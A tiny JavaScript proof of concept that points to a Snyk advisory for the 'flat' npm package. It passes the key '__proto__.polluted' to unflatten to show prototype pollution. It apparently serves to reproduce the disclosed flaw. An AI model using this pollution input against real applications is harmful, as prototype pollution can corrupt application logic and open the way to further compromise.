//https://snyk.io/vuln/SNYK-JS-FLAT-596927
 
  var unflatten = require("flat").unflatten;

   

  unflatten({
    "__proto__.polluted": "yes",
  });
// End of file
